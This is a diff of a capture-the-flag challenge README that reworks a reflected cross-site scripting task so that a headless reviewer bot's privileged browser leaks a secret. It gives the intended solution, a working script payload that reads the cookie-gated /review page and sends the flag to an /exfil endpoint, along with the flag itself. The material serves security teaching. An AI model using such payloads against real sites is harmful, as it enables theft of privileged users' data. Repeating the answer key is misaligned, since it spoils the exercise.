@@ -1,16 +1,44 @@
-# WEB-02 — Reflected XSS
+# WEB-02 — Reflected XSS (with reviewer bot)
 
 ## Category
 Web vulnerability
 
 ## Objective
-Exploit a reflected cross-site scripting vulnerability in the support-search function.
+Steal a secret that only an internal reviewer can see, by getting the reviewer's
+browser to execute a reflected-XSS payload.
 
 ## Vulnerability
-The search parameter is inserted directly into the HTML response without output encoding.
+`GET /search?q=` reflects `q` into the HTML response without output encoding, so
+injected markup/script executes in the app's origin. The flag lives on `/review`,
+which is served **only** to a client holding the reviewer cookie. A headless
+reviewer bot visits any text reported via `/report`, so an attacker can make the
+bot's privileged browser run script that reads `/review` and exfiltrates it.
+
+## Components
+- `app.py` — the web app (vulnerable `/search`; cookie-gated `/review`; `/report`
+  queue; `/exfil` + `/stolen` so the challenge is self-contained).
+- `bot.py` — headless-Chromium reviewer that visits reported payloads with the
+  reviewer cookie (`docker-compose` runs it as the `web02-bot` service).
+
+## Setup
+```bash
+cd machine-c/WEB02
+docker compose up --build      # starts web02 (:8083) and the reviewer bot
+```
+
+## Intended Solution
+1. Confirm `/review` is forbidden to you directly (403) — you need the bot to read it.
+2. Submit an XSS payload via `/report?q=`, e.g.:
+   ```html
+   <script>
+   fetch('/review').then(r=>r.text()).then(t=>{
+     let m=t.match(/CITS3006\{[^}]+\}/);
+     fetch('/exfil?data='+encodeURIComponent(m[0]));
+   })</script>
+   ```
+3. The reviewer bot visits `/search?q=<payload>` with its cookie; the script reads
+   `/review` and posts the secret to `/exfil`.
+4. Retrieve it from `/stolen`.
 
 ## Flag
 CITS3006{WEB02_REFLECTED_XSS}
-
-## Intended Technique
-Use a JavaScript payload through the reflected search parameter to execute script in the portal's origin.
